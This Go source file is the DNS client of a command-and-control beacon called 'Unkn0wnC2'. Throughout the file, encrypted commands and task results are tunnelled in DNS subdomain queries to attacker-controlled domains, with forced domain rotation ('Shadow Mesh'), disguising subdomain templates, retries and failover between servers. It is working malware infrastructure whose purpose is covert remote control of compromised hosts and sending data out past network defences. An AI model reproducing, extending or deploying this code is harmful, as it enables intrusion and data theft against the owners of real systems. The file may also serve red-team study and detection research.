// Package main implements DNS client functionality for the Unkn0wnC2 beacon.
// This handles DNS query construction, response parsing, and the core DNS
// communication protocol for C2 operations.
package main

import (
	"context"
	"crypto/rand"
	"fmt"
	"math/big"
	"net"
	"strings"
	"sync"
	"time"
)

// DNSClient handles DNS-based C2 communication
type DNSClient struct {
	config        *Config
	aesKey        []byte
	lastDomain    string                   // Last domain used (to avoid consecutive repeats)
	domainIndex   int                      // For round-robin selection
	failedDomains map[string]time.Time     // Tracks temporarily failed domains
	domainLatency map[string]time.Duration // Tracks domain response times for weighted selection
	successCounts map[string]int           // Tracks successful queries per domain
	failureCounts map[string]int           // Tracks consecutive failures per domain
	mutex         sync.RWMutex
}

// newDNSClient creates a DNS client with configured timeout and resolver settings
// for communicating with the C2 DNS server.
func newDNSClient() *DNSClient {
	config := getConfig()
	aesKey := generateAESKey(config.EncryptionKey)

	return &DNSClient{
		config:        &config,
		aesKey:        aesKey,
		lastDomain:    "",
		domainIndex:   0,
		failedDomains: make(map[string]time.Time),
		domainLatency: make(map[string]time.Duration),
		successCounts: make(map[string]int),
		failureCounts: make(map[string]int),
	}
}

// selectDomain chooses a domain based on the configured selection mode
// Each chunk can go to a different DNS server for distributed load balancing
// The chunk format contains taskID so Master can reassemble from any server
// IMPORTANT: Never selects the same domain twice in a row for true Shadow Mesh behavior
func (c *DNSClient) selectDomain(taskID string) (string, error) {
	domains := c.config.GetDomains()
	if len(domains) == 0 {
		return "", fmt.Errorf("no DNS domains configured")
	}

	// Hold lock for entire operation to prevent race conditions
	c.mutex.Lock()
	defer c.mutex.Unlock()

	// Single domain case - no selection needed
	if len(domains) == 1 {
		c.lastDomain = domains[0]
		return domains[0], nil
	}

	// Clean up expired failed domains (retry after 2 minutes)
	now := time.Now()
	for domain, failTime := range c.failedDomains {
		if now.Sub(failTime) > 2*time.Minute {
			delete(c.failedDomains, domain)
			delete(c.failureCounts, domain) // Reset failure count
		}
	}

	// Filter out currently failed domains
	availableDomains := []string{}
	lastUsed := c.lastDomain
	for _, domain := range domains {
		if _, failed := c.failedDomains[domain]; !failed {
			availableDomains = append(availableDomains, domain)
		}
	}

	// If all domains failed, reset and use all domains
	if len(availableDomains) == 0 {
		availableDomains = domains
		c.failedDomains = make(map[string]time.Time)
	}

	// CRITICAL: Exclude last used domain to force rotation (Shadow Mesh)
	// Only if we have more than one available domain
	if len(availableDomains) > 1 && lastUsed != "" {
		filteredDomains := []string{}
		for _, domain := range availableDomains {
			if domain != lastUsed {
				filteredDomains = append(filteredDomains, domain)
			}
		}
		// Only use filtered list if it has domains (edge case: last used was the only working one)
		if len(filteredDomains) > 0 {
			availableDomains = filteredDomains
		}
	}

	var selectedDomain string
	mode := c.config.GetSelectionMode()

	switch mode {
	case "random":
		// Random selection for load balancing
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
		if err != nil {
			// Fallback to first domain if crypto/rand fails
			selectedDomain = availableDomains[0]
		} else {
			selectedDomain = availableDomains[n.Int64()]
		}

	case "round-robin":
		// Round-robin selection
		c.domainIndex = c.domainIndex % len(availableDomains)
		selectedDomain = availableDomains[c.domainIndex]
		c.domainIndex++

	case "failover":
		// Failover: always use first available domain
		selectedDomain = availableDomains[0]

	case "weighted":
		// Weighted selection based on latency and success rate
		// Prefer faster, more reliable domains
		selectedDomain = c.selectWeightedDomainLocked(availableDomains)

	default:
		// Default to random
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
		if err != nil {
			selectedDomain = availableDomains[0]
		} else {
			selectedDomain = availableDomains[n.Int64()]
		}
	}

	// Store the selected domain as the last used
	c.lastDomain = selectedDomain

	return selectedDomain, nil
}

// selectWeightedDomainLocked is the internal implementation that assumes mutex is held
func (c *DNSClient) selectWeightedDomainLocked(domains []string) string {
	if len(domains) == 1 {
		return domains[0]
	}

	// Calculate scores for each domain (lower is better)
	bestScore := float64(99999)
	bestDomain := domains[0]

	for _, domain := range domains {
		score := float64(1000) // Default score for new domains

		// Factor in latency (if we have data)
		if latency, ok := c.domainLatency[domain]; ok {
			score = float64(latency.Milliseconds())
		}

		// Factor in success rate (boost score for reliable domains)
		if successCount, ok := c.successCounts[domain]; ok && successCount > 0 {
			// Reduce score by 10% for every 10 successful queries (up to 50% reduction)
			discount := float64(successCount) / 10.0
			if discount > 0.5 {
				discount = 0.5
			}
			score = score * (1.0 - discount)
		}

		if score < bestScore {
			bestScore = score
			bestDomain = domain
		}
	}

	return bestDomain
}

// updateDomainMetrics updates performance tracking for a domain after a successful query
func (c *DNSClient) updateDomainMetrics(domain string, latency time.Duration) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	// Update latency (exponential moving average)
	if existing, ok := c.domainLatency[domain]; ok {
		// 80% old, 20% new
		c.domainLatency[domain] = (existing*4 + latency) / 5
	} else {
		c.domainLatency[domain] = latency
	}

	// Increment success count (cap at 100 to prevent overflow)
	if count, ok := c.successCounts[domain]; ok && count < 100 {
		c.successCounts[domain] = count + 1
	} else if !ok {
		c.successCounts[domain] = 1
	}
}

// markDomainFailed marks a domain as temporarily failed
func (c *DNSClient) markDomainFailed(domain string) {
	c.mutex.Lock()
	c.failedDomains[domain] = time.Now()
	c.mutex.Unlock()
}

// encodeCommand encrypts and encodes a command string for DNS transmission
func (c *DNSClient) encodeCommand(command string) (string, error) {
	if c.config.Encoding == "base36" {
		return base36EncodeString(command), nil
	}
	encoded, err := encryptAndEncode(command, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
	}
	return encoded, nil
}

// encodeForPhase encrypts/encodes using the phase-specific encryption setting
func (c *DNSClient) encodeForPhase(command string, encrypted bool) (string, error) {
	if !encrypted {
		return base36EncodeString(command), nil
	}
	encoded, err := encryptAndEncode(command, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
	}
	return encoded, nil
}

// decodeResponse decodes and decrypts a DNS response back to readable format
func (c *DNSClient) decodeResponse(encoded string) (string, error) {
	if c.config.Encoding == "base36" {
		return base36DecodeString(encoded)
	}
	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
	}
	return decoded, nil
}

// decodeForPhase decodes using the phase-specific encryption setting
func (c *DNSClient) decodeForPhase(encoded string, encrypted bool) (string, error) {
	if !encrypted {
		return base36DecodeString(encoded)
	}
	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
	}
	return decoded, nil
}

// countDataSlots counts the number of X characters in a payload format template
func countDataSlots(format string) int {
	count := 0
	for _, ch := range format {
		if ch == 'X' {
			count++
		}
	}
	return count
}

// formatPayloadWithTemplate fills X positions in the format string with encoded data.
// Dots in the format become DNS label separators. Non-X, non-dot chars are literal decorators.
// Validates that no DNS label exceeds 63 characters (RFC 1035).
func formatPayloadWithTemplate(encoded string, format string) (string, error) {
	xCount := countDataSlots(format)
	if len(encoded) > xCount {
		return "", fmt.Errorf("encoded data length %d exceeds template capacity %d", len(encoded), xCount)
	}

	// Validate label lengths in format (split by dots, each segment <= 63 chars)
	for i, segment := range strings.Split(format, ".") {
		if len(segment) > 63 {
			return "", fmt.Errorf("format label %d is %d chars, exceeds DNS max 63", i, len(segment))
		}
	}

	// Fill X-slots with data chars and include decorators between them.
	// Stop as soon as all data chars are consumed — remaining format chars are dropped.
	// No padding: a shorter subdomain with the correct decorators is produced.
	var result strings.Builder
	dataIdx := 0
	for _, ch := range format {
		if dataIdx >= len(encoded) {
			break // all data consumed; drop the rest of the template
		}
		if ch == 'X' {
			result.WriteByte(encoded[dataIdx])
			dataIdx++
		} else {
			result.WriteRune(ch)
		}
	}
	return result.String(), nil
}

// sendPhaseQuery sends a command using phase-specific settings (encryption, query type, format)
// Returns (response, error). For A-record queries, response is the matched IP address.
func (c *DNSClient) sendPhaseQuery(command string, taskID string, phase PhaseConfig) (string, error) {
	return c.sendPhaseQueryWithDepth(command, taskID, phase, 0)
}

func (c *DNSClient) sendPhaseQueryWithDepth(command string, taskID string, phase PhaseConfig, depth int) (string, error) {
	maxDepth := len(c.config.GetDomains())
	if depth >= maxDepth {
		return "", fmt.Errorf("all DNS servers exhausted after %d failover attempts", depth)
	}

	encodedCmd, err := c.encodeForPhase(command, phase.Encrypted)
	if err != nil {
		return "", fmt.Errorf("failed to encode command: %v", err)
	}

	maxPayload := phase.MaxPayload
	if maxPayload <= 0 {
		maxPayload = c.config.MaxCommandLength
		if maxPayload <= 0 {
			maxPayload = 400
		}
	}
	if len(encodedCmd) > maxPayload {
		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), maxPayload)
	}

	domain, err := c.selectDomain(taskID)
	if err != nil {
		return "", fmt.Errorf("failed to select domain: %v", err)
	}

	var subdomainPart string
	if phase.PayloadFormat != "" {
		formatted, fmtErr := formatPayloadWithTemplate(encodedCmd, phase.PayloadFormat)
		if fmtErr == nil {
			subdomainPart = formatted
		}
	}
	if subdomainPart == "" {
		var labels []string
		for len(encodedCmd) > 0 {
			chunkSize := len(encodedCmd)
			if chunkSize > 62 {
				chunkSize = 62
			}
			labels = append(labels, encodedCmd[:chunkSize])
			encodedCmd = encodedCmd[chunkSize:]
		}
		subdomainPart = strings.Join(labels, ".")
	}

	queryName := fmt.Sprintf("%s.%s", subdomainPart, domain)
	if len(queryName) > 253 {
		return "", fmt.Errorf("FQDN length %d exceeds DNS max 253 chars", len(queryName))
	}

	var result string
	queryStart := time.Now()

	var resolver *net.Resolver
	if c.config.DNSServer != "" {
		resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{Timeout: time.Duration(c.config.Timeout) * time.Second}
				return d.DialContext(ctx, "udp", c.config.DNSServer)
			},
		}
	}

	queryType := phase.QueryType
	if queryType == "" {
		queryType = "TXT"
	}

	retries := c.config.RetryAttempts
	if retries < 1 {
		retries = 1
	}
	for attempt := 0; attempt < retries; attempt++ {
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(c.config.Timeout)*time.Second)

		switch queryType {
		case "TXT":
			var txtRecords []string
			var lookupErr error
			if resolver != nil {
				txtRecords, lookupErr = resolver.LookupTXT(ctx, queryName)
			} else {
				txtRecords, lookupErr = net.DefaultResolver.LookupTXT(ctx, queryName)
			}
			if lookupErr == nil && len(txtRecords) > 0 {
				decoded, decErr := c.decodeForPhase(txtRecords[0], phase.Encrypted)
				if decErr == nil {
					result = decoded
				} else {
					result = fmt.Sprintf("Raw TXT: %s", txtRecords[0])
				}
				err = nil
				break
			}
			err = lookupErr

		case "A":
			var lookupErr error
			var ips []net.IP
			if resolver != nil {
				ips, lookupErr = resolver.LookupIP(ctx, "ip4", queryName)
			} else {
				ips, lookupErr = net.DefaultResolver.LookupIP(ctx, "ip4", queryName)
			}
			if lookupErr == nil && len(ips) > 0 {
				result = ips[0].String()
				err = nil
				break
			}
			err = lookupErr
		}

		cancel()
		if err == nil {
			break
		}
		if attempt < c.config.RetryAttempts-1 {
			backoffDelay := time.Duration((attempt+1)*(attempt+1)) * time.Second
			if backoffDelay > 10*time.Second {
				backoffDelay = 10 * time.Second
			}
			time.Sleep(backoffDelay)
		}
	}

	if err == nil {
		latency := time.Since(queryStart)
		c.updateDomainMetrics(domain, latency)
		c.mutex.Lock()
		delete(c.failureCounts, domain)
		c.mutex.Unlock()
	}

	if err != nil {
		c.mutex.Lock()
		c.failureCounts[domain]++
		failCount := c.failureCounts[domain]
		c.mutex.Unlock()

		if failCount >= 2 {
			c.markDomainFailed(domain)
		}

		domains := c.config.GetDomains()
		if len(domains) > 1 {
			newDomain, selErr := c.selectDomain("")
			if selErr == nil && newDomain != domain {
				return c.sendPhaseQueryWithDepth(command, taskID, phase, depth+1)
			}
		}

		return "", fmt.Errorf("DNS query to %s failed after %d attempts (depth %d): %v", domain, c.config.RetryAttempts, depth, err)
	}

	return result, nil
}

// sendPhaseCommand wraps sendPhaseQuery with timestamp appending (like sendCommand)
func (c *DNSClient) sendPhaseCommand(command string, phase PhaseConfig) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("empty command")
	}

	timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)

	taskID := ""
	parts := strings.Split(command, "|")
	if len(parts) >= 3 {
		cmdType := parts[0]
		if cmdType == "RESULT" || cmdType == "RESULT_META" || cmdType == "DATA" || cmdType == "RESULT_COMPLETE" {
			taskID = parts[2]
		}
	}

	return c.sendPhaseQuery(commandWithTimestamp, taskID, phase)
}

